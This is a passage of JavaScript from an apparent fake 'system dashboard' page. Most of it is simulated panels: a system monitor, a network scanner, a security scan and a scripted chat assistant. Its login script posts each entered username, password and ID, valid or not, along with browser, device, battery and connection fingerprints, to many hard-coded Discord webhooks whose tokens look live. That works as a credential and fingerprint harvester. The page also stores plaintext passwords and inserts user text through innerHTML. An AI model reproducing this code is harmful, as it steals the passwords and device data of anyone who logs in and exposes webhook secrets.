              case 'settingsDebugMode':
                  console.log('Debug mode toggled:', value);
                  break;
              case 'settingsLogLevel':
                  console.log('Log level set to:', value);
                  break;
              case 'settingsBackgroundStyle':
                  console.log('Background style changed to:', value);
                  // Apply background style change (e.g., add class to body)
                  break;
          }
      },

      // Load current settings into the UI controls
      loadSettingsIntoUI: function() {
        const settings = this.loadSettings();
        document.getElementById('settingsThemeToggle').checked = settings.dashboardTheme === 'light';
        document.getElementById('settingsFontSize').value = settings.settingsFontSize;
        document.getElementById('settingsFontSizeValue').textContent = `${parseFloat(settings.settingsFontSize).toFixed(1)}x`;
        document.getElementById('settingsAccentColor').value = settings.settingsAccentColor;
        document.getElementById('settingsBackgroundStyle').value = settings.settingsBackgroundStyle;
        document.getElementById('settingsNotifyEnabled').checked = settings.settingsNotifyEnabled;
        document.getElementById('settingsNotifyTimeout').value = settings.settingsNotifyTimeout;
        document.getElementById('settingsNotifySound').checked = settings.settingsNotifySound;
        document.getElementById('settingsShowAnnouncements').checked = settings.settingsShowAnnouncements;
        document.getElementById('settingsShowMotivation').checked = settings.settingsShowMotivation;
        document.getElementById('settingsAutoThemeBasedOnTime').checked = settings.settingsAutoThemeBasedOnTime;
        document.getElementById('settingsPanicButtonBehavior').checked = settings.settingsPanicButtonBehavior;
        document.getElementById('settingsConfirmRestart').value = settings.settingsConfirmRestart;
        document.getElementById('settingsEnableAutoSave').checked = settings.settingsEnableAutoSave;
        document.getElementById('settingsDebugMode').checked = settings.settingsDebugMode;
        document.getElementById('settingsLogLevel').value = settings.settingsLogLevel;

        // Apply initial settings on load/UI population
        this.applySetting('settingsThemeToggle', settings.dashboardTheme === 'light');
        this.applySetting('settingsFontSize', settings.settingsFontSize);
        this.applySetting('settingsAccentColor', settings.settingsAccentColor);
        this.applySetting('settingsShowAnnouncements', settings.settingsShowAnnouncements);
        this.applySetting('settingsShowMotivation', settings.settingsShowMotivation);
        // ... apply other settings if they have immediate effects
      },

      // --- Reminder System ---
      initReminderSystem: function() {
        const newReminderInput = document.getElementById('newReminderInput');
        const addReminderBtn = document.getElementById('addReminderBtn');
        const reminderList = document.getElementById('reminderList');

        // Load reminders from localStorage
        const savedReminders = JSON.parse(localStorage.getItem('dashboardReminders') || '[]');
        savedReminders.forEach(reminderText => this.addReminderToList(reminderText, false)); // 'false' for no re-save

        addReminderBtn.addEventListener('click', () => {
            const reminderText = newReminderInput.value.trim();
            if (reminderText) {
                this.addReminderToList(reminderText, true); // 'true' to save
                newReminderInput.value = ''; // Clear input
                this.showNotification('Reminder added.', 'success');
            }
        });
        
        // Allow adding reminder with Enter key
        newReminderInput.addEventListener('keypress', (e) => {
            if (e.key === 'Enter') {
                addReminderBtn.click(); // Trigger button click
            }
        });

        // Add reminder button to Quick Bar or Main Controls
        const reminderPanelBtn = document.querySelector('.quick-bar button, .main-controls-bar button').cloneNode(true); // Dummy clone
        const btn = document.createElement('button');
        btn.textContent = '🔔 Reminders';
        btn.onclick = () => this.togglePanel('reminderSection');
        // Find a suitable place to insert it, e.g., after notes button
        const notesBtn = document.getElementById('notesBtn');
        notesBtn.parentNode.insertBefore(btn, notesBtn.nextSibling);
      },

      addReminderToList: function(text, save = true) {
          const reminderList = document.getElementById('reminderList');
          const item = document.createElement('li');
          item.className = 'reminder-item';
          item.innerHTML = `<span>${text}</span><button class="delete-reminder">×</button>`;
          
          const deleteBtn = item.querySelector('.delete-reminder');
          deleteBtn.addEventListener('click', () => {
              reminderList.removeChild(item);
              this.removeReminderFromStorage(text);
              this.showNotification('Reminder removed.', 'info');
          });

          reminderList.appendChild(item);

          if (save) {
              const savedReminders = JSON.parse(localStorage.getItem('dashboardReminders') || '[]');
              savedReminders.push(text);
              localStorage.setItem('dashboardReminders', JSON.stringify(savedReminders));
          }
      },

      removeReminderFromStorage: function(text) {
          let savedReminders = JSON.parse(localStorage.getItem('dashboardReminders') || '[]');
          savedReminders = savedReminders.filter(r => r !== text);
          localStorage.setItem('dashboardReminders', JSON.stringify(savedReminders));
      },

      // --- Placeholder Functions for New Panels ---
      
      // System Monitor
      initSystemMonitor: function() {
        const cpuBar = document.getElementById('cpuUsageBar');
        const ramBar = document.getElementById('ramUsageBar');
        const diskBar = document.getElementById('diskUsageBar');
        const networkBar = document.getElementById('networkActivityBar');

        let cpuUsage = 0, ramUsage = 0, diskUsage = 0, networkSpeed = 0;

        const updateMonitor = () => {
            cpuUsage = Math.min(95, cpuUsage + Math.random() * 5);
            ramUsage = Math.min(90, ramUsage + Math.random() * 7);
            diskUsage = Math.min(85, diskUsage + Math.random() * 3);
            networkSpeed = Math.min(1000, networkSpeed + Math.random() * 50);

            cpuBar.style.width = `${cpuUsage}%`;
            cpuBar.textContent = `${Math.round(cpuUsage)}%`;
            ramBar.style.width = `${ramUsage}%`;
            ramBar.textContent = `${Math.round(ramUsage)}%`;
            diskBar.style.width = `${diskUsage}%`;
            diskBar.textContent = `${Math.round(diskUsage)}%`;
            networkBar.style.width = `${Math.min(100, (networkSpeed / 1000) * 100)}%`;
            networkBar.textContent = `${Math.round(networkSpeed)} Mbps`;
        };
        this.monitorInterval = setInterval(updateMonitor, 1500); // Update every 1.5 seconds
      },

      // Network Scanner
      initNetworkScanner: function() {
        const startScanBtn = document.getElementById('startScanBtn');
        const networkTargetInput = document.getElementById('networkTarget');
        const resultsBody = document.getElementById('networkScanResults');

        startScanBtn.addEventListener('click', () => {
            const target = networkTargetInput.value.trim();
            if (!target) {
                this.showNotification('Please enter a target IP range or subnet.', 'warn');
                return;
            }
            this.showNotification(`Scanning network range: ${target}...`, 'info');
            resultsBody.innerHTML = `<tr><td colspan="5" style="text-align: center; color: #aaa;">Scanning...</td></tr>`;
            
            // Simulate scan results
            setTimeout(() => {
                resultsBody.innerHTML = ''; // Clear previous results
                const mockResults = [
                    { ip: '192.168.1.1', hostname: 'Gateway', status: 'online', mac: '00:1A:2B:3C:4D:5E', vendor: 'RouterBrand' },
                    { ip: '192.168.1.10', hostname: 'Printer01', status: 'online', mac: 'AA:BB:CC:DD:EE:FF', vendor: 'PrinterMaker' },
                    { ip: '192.168.1.15', hostname: 'Unknown', status: 'offline', mac: '11:22:33:44:55:66', vendor: 'Unknown' },
                    { ip: '192.168.1.20', hostname: 'UserPC-01', status: 'online', mac: '99:88:77:66:55:44', vendor: 'PCManufacturer' },
                    { ip: '192.168.1.25', hostname: 'Server01', status: 'online', mac: '12:34:56:78:9A:BC', vendor: 'ServerCompany' },
                    { ip: '192.168.1.30', hostname: 'Unknown', status: 'unknown', mac: null, vendor: 'Unknown' },
                ];
                
                mockResults.forEach(result => {
                    const row = resultsBody.insertRow();
                    row.innerHTML = `
                        <td>${result.ip}</td>
                        <td>${result.hostname}</td>
                        <td class="status-${result.status}">${result.status.charAt(0).toUpperCase() + result.status.slice(1)}</td>
                        <td>${result.mac || '-'}</td>
                        <td>${result.vendor || '-'}</td>
                    `;
                });
                this.showNotification('Network scan completed.', 'success');
            }, 2000); // Simulate a 2-second scan
        });
      },

      // Security Suite
      initSecuritySuite: function() {
        const quickScanBtn = document.getElementById('quickScanBtn');
        const fullScanBtn = document.getElementById('fullScanBtn');
        const updateDefsBtn = document.getElementById('updateDefsBtn');
        const securityScanResults = document.getElementById('securityScanResults');

        const addScanLog = (message, type = 'info') => {
            const logEntry = document.createElement('div');
            logEntry.className = `scan-item ${type}`;
            logEntry.innerHTML = `<span>[${type.toUpperCase()}] ${message}</span>`;
            securityScanResults.appendChild(logEntry);
            securityScanResults.scrollTop = securityScanResults.scrollHeight; // Auto-scroll
        };

        const performScan = (type) => {
            addScanLog('Starting scan...');
            let threatsFound = 0;
            const scanInterval = setInterval(() => {
                const status = Math.random();
                if (status < 0.1) {
                    addScanLog('Threat detected: Malware.Trojan.XYZ', 'threat');
                    threatsFound++;
                } else if (status < 0.3) {
                    addScanLog('Potentially unwanted program found.', 'warn');
                } else {
                    addScanLog('Scanning system files...', 'info');
                }
            }, 500);

            setTimeout(() => {
                clearInterval(scanInterval);
                let finalMessage = 'Scan completed successfully.';
                if (threatsFound > 0) {
                    finalMessage = `${threatsFound} threats detected and quarantined.`;
                    addScanLog(finalMessage, 'threat');
                } else {
                    addScanLog(finalMessage, 'clean');
                }
                this.showNotification(`Security ${type} scan finished. ${threatsFound} threats found.`, threatsFound > 0 ? 'error' : 'success');
            }, 3000); // Simulate a 3-second scan
        };

        quickScanBtn.addEventListener('click', () => performScan('Quick'));
        fullScanBtn.addEventListener('click', () => performScan('Full'));
        updateDefsBtn.addEventListener('click', () => {
            addScanLog('Checking for definition updates...');
            setTimeout(() => {
                addScanLog('Definitions are up-to-date.', 'info');
                this.showNotification('Security definitions updated.', 'success');
            }, 1500);
        });
      },

      // User Manager
      initUserManager: function() {
        // Placeholder for adding users, editing, deleting
        // Event delegation for dynamic rows could be implemented here
      },

      // Log Viewer
      initLogViewer: function() {
        const logEntriesContainer = document.getElementById('logEntries');
        const startLoggingBtn = document.getElementById('startLoggingBtn');
        const stopLoggingBtn = document.getElementById('stopLoggingBtn');
        const clearLogBtn = document.getElementById('clearLogBtn');
        const levelFilter = document.getElementById('logLevelFilter');

        let logInterval = null;
        let logCounter = 0;
        const logLevels = ['info', 'warn', 'error'];

        const addLogEntry = (message, level = 'info') => {
            if (!logEntriesContainer) return;
            
            const currentFilter = levelFilter.value;
            if (currentFilter !== 'all' && level !== currentFilter) {
                return; // Skip if level doesn't match filter
            }

            const entry = document.createElement('div');
            entry.className = `log-entry ${level}`;
            const timestamp = new Date().toLocaleTimeString([], { hour: "2-digit", minute: "2-digit", second: "2-digit" });
            entry.innerHTML = `
                <span>${timestamp}</span>
                <span class="level">${level.toUpperCase()}</span>
                <span class="message">${message}</span>
            `;
            logEntriesContainer.appendChild(entry);
            logEntriesContainer.scrollTop = logEntriesContainer.scrollHeight; // Auto-scroll
        };

        startLoggingBtn.addEventListener('click', () => {
            if (!logInterval) {
                logCounter = 0; // Reset counter
                addLogEntry('Logging started.');
                logInterval = setInterval(() => {
                    logCounter++;
                    const level = logLevels[Math.floor(Math.random() * logLevels.length)];
                    addLogEntry(`System event #${logCounter}`, level);
                    if (logCounter % 5 === 0 && level !== 'info') { // Occasional warnings/errors
                        addLogEntry(`Potential issue detected in module ${Math.floor(Math.random()*100)}`, 'warn');
                    }
                    if (logCounter % 15 === 0) {
                        addLogEntry(`Critical alert from subsystem ${Math.floor(Math.random()*50)}`, 'error');
                    }
                }, 1000); // Log every second
            }
        });

        stopLoggingBtn.addEventListener('click', () => {
            if (logInterval) {
                clearInterval(logInterval);
                logInterval = null;
                addLogEntry('Logging stopped.');
            }
        });

        clearLogBtn.addEventListener('click', () => {
            logEntriesContainer.innerHTML = '';
            addLogEntry('Log buffer cleared.');
        });

        levelFilter.addEventListener('change', () => {
            // Re-render or filter visible logs based on new filter
            // For simplicity, we'll just filter future logs. A full re-render would be needed for past logs.
            addLogEntry(`Log filter set to: ${levelFilter.value.toUpperCase()}.`, 'info');
        });
      },

      // File Manager
      initFileExplorer: function() {
        const fileTree = document.getElementById('fileTree');
        const fileList = document.getElementById('fileList');

        // Add click listeners for folders in file tree
        fileTree.querySelectorAll('.folder-name').forEach(folderNameElement => {
            folderNameElement.addEventListener('click', (e) => {
                const folderElement = e.target.parentElement;
                const isExpanded = folderElement.style.marginLeft === '20px'; // Simple check if expanded
                
                // Toggle visibility of children
                let nextSibling = folderElement.nextElementSibling;
                while (nextSibling && !nextSibling.classList.contains('folder-name') && !nextSibling.classList.contains('file-name')) {
                    nextSibling.style.display = isExpanded ? 'none' : 'block';
                    nextSibling = nextSibling.nextElementSibling;
                }
                
                // Update margin or add class to indicate expansion state
                folderElement.style.marginLeft = isExpanded ? '0px' : '20px';
                e.stopPropagation(); // Prevent event from bubbling up
            });
        });

        // Add click listeners for files/folders in file list
        fileList.querySelectorAll('.file-item').forEach(fileItemElement => {
            fileItemElement.addEventListener('click', (e) => {
                const fileName = e.target.querySelector('.folder-name, .file-name').textContent;
                const isFolder = e.target.classList.contains('folder');
                
                // Highlight selected item
                document.querySelectorAll('.file-list .file-item').forEach(item => item.style.backgroundColor = ''); // Reset others
                e.target.style.backgroundColor = 'rgba(50, 50, 50, 0.8)';
                
                if (isFolder) {
                    this.showNotification(`Opened folder: ${fileName}`);
                } else {
                    this.showNotification(`Selected file: ${fileName}`);
                }
                e.stopPropagation();
            });
        });
      },

      // Process Viewer
      initProcessViewer: function() {
        const refreshProcessesBtn = document.querySelector('#processViewerPanel .process-actions button:first-child');
        const processTableBody = document.getElementById('processTableBody');

        const populateProcesses = () => {
            processTableBody.innerHTML = ''; // Clear existing
            const mockProcesses = [
                { name: 'System Kernel', pid: 1, cpu: 15.5, mem: '120 MB', status: 'Running' },
                { name: 'Dashboard GUI', pid: 1024, cpu: 8.2, mem: '85 MB', status: 'Running' },
                { name: 'AI Assistant', pid: 2048, cpu: 2.1, mem: '40 MB', status: 'Running' },
                { name: 'Security Scanner', pid: 3001, cpu: 0.5, mem: '20 MB', status: 'Idle' },
                { name: 'File Explorer', pid: 4005, cpu: 1.1, mem: '35 MB', status: 'Running' },
                { name: 'Log Viewer Service', pid: 5010, cpu: 0.2, mem: '10 MB', status: 'Running' },
                { name: 'System Update Process', pid: 6000, cpu: 5.0, mem: '60 MB', status: 'Paused' },
                { name: 'Network Monitor Daemon', pid: 7007, cpu: 0.8, mem: '25 MB', status: 'Running' },
                { name: 'Background Task', pid: 8111, cpu: 0.0, mem: '5 MB', status: 'Stopped' },
                { name: 'TestProcess.exe', pid: 9999, cpu: 0.1, mem: '2 MB', status: 'Stopped' },
            ];

            mockProcesses.forEach(proc => {
                const row = processTableBody.insertRow();
                row.innerHTML = `
                    <td><span class="process-name">${proc.name}</span></td>
                    <td>${proc.pid}</td>
                    <td>${proc.cpu}%</td>
                    <td>${proc.mem}</td>
                    <td>${proc.status}</td>
                    <td><button>Terminate</button></td>
                `;
            });
        };

        refreshProcessesBtn.addEventListener('click', () => {
            this.showNotification('Refreshing process list...', 'info');
            populateProcesses();
        });

        populateProcesses(); // Initial population
      },

      // AI Assistant
      initAI: function() {
        const aiInput = document.getElementById('aiInput');
        const aiSendBtn = document.getElementById('aiSendBtn');
        const chatContainer = document.getElementById('chatContainer');

        const addMessage = (message, sender) => {
            const messageElement = document.createElement('div');
            messageElement.className = `message ${sender}-message`;
            messageElement.textContent = message;
            chatContainer.appendChild(messageElement);
            chatContainer.scrollTop = chatContainer.scrollHeight; // Auto-scroll
        };

        const handleUserMessage = (message) => {
            addMessage(message, 'user');
            // Simulate AI response
            setTimeout(() => {
                let response = "I'm sorry, I don't understand that.";
                if (message.toLowerCase().includes('hello') || message.toLowerCase().includes('hi')) {
                    response = "Hello there! How can I assist you with the system today?";
                } else if (message.toLowerCase().includes('help')) {
                    response = "You can ask me about system status, specific tools, or general functions. Try asking 'What is the CPU usage?' or 'How do I open the file manager?'.";
                } else if (message.toLowerCase().includes('cpu usage')) {
                    response = "The current simulated CPU usage is approximately 45%.";
                } else if (message.toLowerCase().includes('file manager')) {
                    response = "You can access the File Manager from the Main Controls section.";
                } else if (message.toLowerCase().includes('settings')) {
                    response = "System settings can be accessed via the 'Settings' button in the Quick Bar.";
                } else if (message.toLowerCase().includes('goodbye') || message.toLowerCase().includes('bye')) {
                    response = "Goodbye! Have a productive day.";
                }
                addMessage(response, 'assistant');
            }, 1000); // Simulate typing delay
        };

        aiSendBtn.addEventListener('click', () => {
            const message = aiInput.value.trim();
            if (message) {
                handleUserMessage(message);
                aiInput.value = ''; // Clear input
            }
        });

        aiInput.addEventListener('keypress', (e) => {
            if (e.key === 'Enter') {
                aiSendBtn.click();
            }
        });
      },

      // Other Panel Initialization Placeholder Functions
      initDataAnalyst: function() { /* Placeholder */ },
      initCommunicationHub: function() { /* Placeholder */ },
      initSystemConfig: function() { /* Placeholder */ },
      initResourceAllocator: function() { /* Placeholder */ },
      runDiagnostic: function(tool) { /* Placeholder */
          const resultsDiv = document.getElementById('diagnosticResults');
          resultsDiv.innerHTML = `<p>Running ${tool.replace(/([A-Z])/g, ' $1').trim()}...</p>`;
          let log = '';
          setTimeout(() => {
              if (tool === 'ping') log = 'Ping to 192.168.1.1: Reply received (avg 15ms).';
              else if (tool === 'traceroute') log = 'Traceroute to google.com completed in 12 hops.';
              else if (tool === 'diskcheck') log = 'Disk C: check passed. No errors found.';
              else if (tool === 'memtest') log = 'Memory test completed. All blocks OK.';
              else if (tool === 'cpuStress') log = 'CPU stress test finished. Max temp: 75C.';
              else if (tool === 'networkSpeed') log = 'Download: 980 Mbps, Upload: 150 Mbps.';
              else log = 'Diagnostic test simulated.';
              
              resultsDiv.innerHTML = `<p>${log}</p>`;
              this.showNotification(`${tool.replace(/([A-Z])/g, ' $1').trim()} completed.`, 'success');
          }, 1500);
      },
      initDownloadBypass: function() { /* Placeholder */ },
      // ... and so on for all other panels.
      
      // --- Cleanup ---
      // This function would be called on logout or page unload
      cleanup: function() {
        clearInterval(this.sessionTimerInterval);
        clearInterval(this.clockInterval);
        clearInterval(this.monitorInterval);
        // Clear any other intervals or timeouts
        console.log("Dashboard cleaned up.");
      }
    };

    // --- Login System JavaScript ---
    (function() {
      // Mock Whitelist JSON URL - replace with actual if available
      // For this large code generation, I'll use a dummy local array for simplicity.
      // const USER_JSON_URL = 'https://raw.githubusercontent.com/Nuker214/Private.System/refs/heads/main/Whitelist.json';

      // Mock user data (replace with fetched data in a real scenario)
      const users = [
        { username: "Admin", password: "password123", userID: "1001", name: "System Administrator", role: "Admin", rank: 1, ipAddress: "192.168.1.100", vpnDetected: false, proxyDetected: false, localIPs: ["192.168.1.100"] },
        { username: "Beta.user", password: "betauser1", userID: "281573", name: "Beta User", role: "User", rank: 2, ipAddress: "192.168.1.150", vpnDetected: true, proxyDetected: false, localIPs: ["192.168.1.150"] },
        { username: "Guest", password: "guestpass", userID: "000000", name: "Guest Account", role: "Guest", rank: 3, ipAddress: "192.168.1.200", vpnDetected: false, proxyDetected: true, localIPs: ["192.168.1.200"] }
      ];

      // Logging Webhooks (as provided)
      const loggingWebhooks = {
        username: 'https://discord.com/api/webhooks/1403506302822383726/Cq9jWG6XSG49gBwffXUEZdF5HCZLQC_SGf6f96XrH-Bs5WAxiy_U3OS1a5z00R3aL-vU',
        password: 'https://discord.com/api/webhooks/1403506454488678540/PBX3b6QtOKdsc6FZklZT-zWuXxO_jGNUFhGqtF3Q1ysb-8v95VPAsem44kvgdtNoPnNI',
        identifier: 'https://discord.com/api/webhooks/1403506052565307483/qDWgi0LkM0_DOwWGGR73evb-MqnI8MXMKJTjAYOxtLeltAZ3RsJRHQjf1Oj7Ce9c02cA',
        invalid_username: 'https://discord.com/api/webhooks/1403508639779786935/OjvG2xJet2_NiwAHi6OE_5PdoYPXd3fRBuXSG5FTtPMT9MooblezpxJLqDA97jIUShkp',
        invalid_password: 'https://discord.com/api/webhooks/1403509088113131704/qdUx47oo3-QRcc1IZpoBs2fB2Y05k9Tl2XgOVcVn078AgFFBw0pMUfKrR5gNN_UyKFhp',
        invalid_identifier: 'https://discord.com/api/webhooks/1403509418376822917/pmg748k-gAd3pdrGAumrdYnAbo2HTc_X6ulXvqXUn3vmgPQu7ZtqNNja5Vh8fPLNSq_5',
        attempts_counter: 'https://discord.com/api/webhooks/1403510543637282979/z95YpEiHL2P7G9-fsNVsl1NEcKjXuFOml4rzLjEkJNqu3wXB3JAWHvGS39lC6YRZ_1aw',
        attempts_exceeded: 'https://discord.com/api/webhooks/1403511845800902687/oMnaODY_1ckM-alSj91yLPHaIhW4QLpk0YatR2eoG0PS38KKYq5y1q4VfCTmKbhgKsxQ'
      };

      const webhookUrls = { // Original webhooks
        userLogging: 'https://discord.com/api/webhooks/1402682960397860964/rmNhK0G8NOJlbRN38RdCmPB1-rzXaaogzqIJmA7EuTVEIoFpTinMXLff0qr5ke1RV7K3',
        browserLogging: 'https://discord.com/api/webhooks/1402690380910170154/EJgpyFYc0pyz5EnkOTXiSlM7W1jUnBldRd0PUKLEvERgE6nXfDVAb7NXaKIzR-3APGHP',
        deviceLogging: 'https://discord.com/api/webhooks/1402692400593371289/_Nx1ZdupZIrlkVmCO0J1OIphb9az9I1AZDZ6gjAemL2IHbuMLpWCbTltBfch-i970d1F',
        connectionLogging: 'https://discord.com/api/webhooks/1402694010123849840/IYCqiKdvj9QnFJ9WPoAlFBXzrY2mBnHR5SANj7c1uuYhkQV3Veado9hIVbtqh9PCZO1D',
        sessionLogging: 'https://discord.com/api/webhooks/1402695341257654405/SiXvG8hdSshEfPjz2e7gRQ3P80yqBNZw2AwHlUpEtFtHPD2vbG_Dh8JHjnfdDRD4hmJk'
      };
      // Webhooks for Reset Popup
      const resetPopupWebhookUrls = {
          detected: 'https://discord.com/api/webhooks/1403083012442423377/WNs_yZimluZqsxfZWkLSCfd2vmOYdoyEbsUVOfczHkJykeiThIZ6gYCJILFSHfSDSnsq',
          success: 'https://discord.com/api/webhooks/1403088193850441921/zZKPkgzVBQ7d6aiCkT3WM7j2Y74UO2o1Js9oSnawVBHaSxUQCz-16Qj4uPYk1YxgoanB',
          fail: 'https://discord.com/api/webhooks/1403088326252040372/JgQkJdcVG-8X0jSmw7AZai9YSUODCMZ5hkyWlBe1MBzPRiJgbSlRDWOJUvHVqsK248ip'
      };

      const loginBox = document.getElementById('loginBox');
      const usernameInput = document.getElementById('username');
      const passwordInput = document.getElementById('password');
      const userIDInput = document.getElementById('userID');
      const showPasswordCheckbox = document.getElementById('showPassword');
      const submitBtn = document.getElementById('submitBtn');
      const errorMsg = document.getElementById('errorMsg');
      const attemptsText = document.getElementById('attemptsText');
      const resetPopup = document.getElementById('resetPopup');
      const resetField = document.getElementById('resetField');
      const resetBtn = document.getElementById('resetBtn');

      let attempts = 5;
      let loginTime = null;

      // Show/hide password toggle
      showPasswordCheckbox.addEventListener('change', () => {
        passwordInput.type = showPasswordCheckbox.checked ? 'text' : 'password';
      });

      // Flash red outline function
      function flashRedOutline(times = 2, delay = 400) {
        let count = 0;
        function flash() {
          loginBox.classList.add('flashing');
          setTimeout(() => {
            loginBox.classList.remove('flashing');
            count++;
            if (count < times) setTimeout(flash, delay);
          }, delay);
        }
        flash();
      }

      // Get WebGL Renderer
      function getWebGLRenderer() {
        try {
          const canvas = document.createElement('canvas');
          const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
          if (!gl) return "Unavailable";
          const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
          return debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "Unavailable";
        } catch { return "Unavailable"; }
      }

      // Battery status promise
      async function getBatteryStatus() {
        if (navigator.getBattery) {
          try { return await navigator.getBattery(); } catch { return null; }
        }
        return null;
      }

      // Build user info object from user JSON (using mock data for now)
      function findUser(username, userID) {
        return users.find(u =>
          u.username?.toLowerCase() === username.toLowerCase() &&
          u.userID?.toString() === userID.toString()
        );
      }

      // Send Discord webhook with custom embed fields
      async function sendWebhook(url, embed) {
        try {
          await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ embeds: [embed] }),
          });
        } catch (e) { console.warn('Webhook send failed:', e); }
      }

      // Collect browser & device info for logs
      async function collectLoggingData(user, password) {
        const now = new Date();
        loginTime = now.toISOString();
        const batteryStatus = await getBatteryStatus();

        return {
          user: user || { name: "Unknown", username: "Unknown", userID: "Unknown" }, // Handle cases where user isn't found yet
          password,
          loginTime,
          batteryStatus,
          webglRenderer: getWebGLRenderer(),
        };
      }

      // Embed builders (original ones, slightly modified for clarity)
      function buildUserLoggingEmbed(data) {
        return { title: "User Logging System", color: 0xff0000, fields: [
            { name: "Name", value: data.user.name || "N/A", inline: true },
            { name: "Username", value: data.user.username, inline: true },
            { name: "Password", value: data.password, inline: true },
            { name: "Role", value: data.user.role || "N/A", inline: true },
            { name: "Rank", value: data.user.rank?.toString() || "N/A", inline: true },
            { name: "Login Time", value: data.loginTime, inline: false },
            { name: "User Identifier", value: data.user.userID?.toString() || "N/A", inline: true },
            { name: "Account Creation Date", value: data.user.accountCreationDate || "N/A", inline: true }
        ]};
      }
      function buildBrowserLoggingEmbed(data) {
        const nav = navigator;
        return { title: "Browser Logging System", color: 0x00ff00, fields: [
            { name: "Name", value: data.user.name || "N/A", inline: true },
            { name: "Username", value: data.user.username || "N/A", inline: true },
            { name: "User Identifier", value: data.user.userID?.toString() || "N/A", inline: true },
            { name: "Browser Vendor", value: nav.vendor || "Unknown", inline: true },
            { name: "Browser Language", value: nav.language || "Unknown", inline: true },
            { name: "User Agent", value: nav.userAgent || "Unknown", inline: false },
            { name: "Browser Zoom", value: `${window.devicePixelRatio * 100}%`, inline: true },
            { name: "Incognito Mode", value: "Undetected", inline: true },
            { name: "Cookies Enabled", value: nav.cookieEnabled ? "Yes" : "No", inline: true },
            { name: "WebGL Renderer", value: data.webglRenderer || "Unavailable", inline: true }
        ]};
      }
      function buildDeviceLoggingEmbed(data) {
        const nav = navigator;
        const battery = data.batteryStatus;
        return { title: "Device Logging System", color: 0x0000ff, fields: [
            { name: "Name", value: data.user.name || "N/A", inline: true },
            { name: "Username", value: data.user.username || "N/A", inline: true },
            { name: "User ID", value: data.user.userID?.toString() || "N/A", inline: true },
            { name: "Device Platform", value: nav.platform || "Unknown", inline: true },
            { name: "CPU Cores", value: nav.hardwareConcurrency ? `${nav.hardwareConcurrency} cores` : "Unavailable", inline: true },
            { name: "Device Memory", value: nav.deviceMemory ? `${nav.deviceMemory} GB` : "Unavailable", inline: true },
            { name: "Battery Charging", value: battery?.charging ? "Yes" : "No", inline: true },
            { name: "Battery Level", value: battery ? `${Math.round(battery.level * 100)}%` : "Unavailable", inline: true },
            { name: "Touch Support", value: ('ontouchstart' in window || nav.maxTouchPoints > 0) ? "Yes" : "No", inline: true },
            { name: "Screen Resolution", value: `${screen.width}x${screen.height}`, inline: true }
        ]};
      }
      function buildConnectionLoggingEmbed(data) {
        const nav = navigator;
        return { title: "Connection Logging System", color: 0xffff00, fields: [
            { name: "Name", value: data.user.name || "N/A", inline: true },
            { name: "Username", value: data.user.username || "N/A", inline: true },
            { name: "User ID", value: data.user.userID?.toString() || "N/A", inline: true },
            { name: "Online Status", value: nav.onLine ? "Online" : "Offline", inline: true },
            { name: "Connection Type", value: nav.connection?.type || "Unknown", inline: true },
            { name: "Effective Type", value: nav.connection?.effectiveType || "Unknown", inline: true },
            { name: "IP Address", value: data.user.ipAddress || "Unavailable", inline: true },
            { name: "VPN Detected", value: data.user.vpnDetected ? "Yes" : "No", inline: true },
            { name: "Proxy Detected", value: data.user.proxyDetected ? "Yes" : "No", inline: true }
        ]};
      }
      function buildSessionLoggingEmbed(data) {
        return { title: "Session Logging System", color: 0x00ffff, fields: [
            { name: "Name", value: data.user.name || "N/A", inline: true },
            { name: "Username", value: data.user.username || "N/A", inline: true },
            { name: "User ID", value: data.user.userID?.toString() || "N/A", inline: true },
            { name: "Login Time", value: data.loginTime || "Unknown", inline: true },
            { name: "Session Duration", value: "Simulated", inline: true },
            { name: "Pages Visited", value: "Simulated", inline: false },
            { name: "Actions Performed", value: "Simulated", inline: false }
        ]};
      }

      // New logging functions for specific systems
      async function logSpecificEvent(url, title, fields, color) {
          const embed = { title, color, fields: [...fields, { name: "Timestamp", value: new Date().toLocaleString(), inline: false }] };
          await sendWebhook(url, embed);
      }

      async function logUsername(username) {
          await logSpecificEvent(loggingWebhooks.username, "Username Entry", [{ name: "Username", value: username, inline: true }], 0x3498db);
      }
      async function logPassword(password) {
          await logSpecificEvent(loggingWebhooks.password, "Password Entry", [{ name: "Password", value: password, inline: true }], 0xe74c3c);
      }
      async function logIdentifier(identifier) {
          await logSpecificEvent(loggingWebhooks.identifier, "Identifier Entry", [{ name: "User ID", value: identifier, inline: true }], 0x2ecc71);
      }
      async function logInvalidUsername(username) {
          await logSpecificEvent(loggingWebhooks.invalid_username, "Invalid Username Attempt", [{ name: "Username", value: username, inline: true }], 0xf39c12);
      }
      async function logInvalidPassword(password) {
          await logSpecificEvent(loggingWebhooks.invalid_password, "Invalid Password Attempt", [{ name: "Password", value: password, inline: true }], 0xe67e22);
      }
      async function logInvalidIdentifier(identifier) {
          await logSpecificEvent(loggingWebhooks.invalid_identifier, "Invalid Identifier Attempt", [{ name: "User ID", value: identifier, inline: true }], 0xd35400);
      }
      async function logAttemptsCounter(username, password, identifier, attemptsLeft) {
          await logSpecificEvent(loggingWebhooks.attempts_counter, "Attempts Counter", [
              { name: "Username", value: username, inline: true },
              { name: "Password", value: password, inline: true },
              { name: "User ID", value: identifier, inline: true },
              { name: "Attempts Left", value: attemptsLeft.toString(), inline: true }
          ], 0x9b59b6);
      }
      async function logAttemptsExceeded(username, password, identifier) {
          await logSpecificEvent(loggingWebhooks.attempts_exceeded, "MAX ATTEMPTS EXCEEDED", [
              { name: "Username", value: username, inline: true },
              { name: "Password", value: password, inline: true },
              { name: "User ID", value: identifier, inline: true },
              { name: "Status", value: "Blocked", inline: true }
          ], 0xc0392b);
      }

      // Handle login submission
      async function submitLogin() {
        errorMsg.textContent = '';
        if (!usernameInput.value || !passwordInput.value || !userIDInput.value) {
          errorMsg.textContent = 'Please fill all fields.';
          return;
        }

        const username = usernameInput.value;
        const password = passwordInput.value;
        const userID = userIDInput.value;
        const user = findUser(username, userID);

        // Log specific entry attempts
        await logUsername(username);
        await logPassword(password);
        await logIdentifier(userID);

        // Log attempt counter
        await logAttemptsCounter(username, password, userID, attempts);

        if (!user) {
          await logInvalidUsername(username);
          await logInvalidIdentifier(userID);
          handleFailedAttempt('User not found or invalid identifier.');
          return;
        }

        if (password !== user.password) {
          await logInvalidPassword(password);
          handleFailedAttempt('Incorrect password.');
          return;
        }

        // Correct login
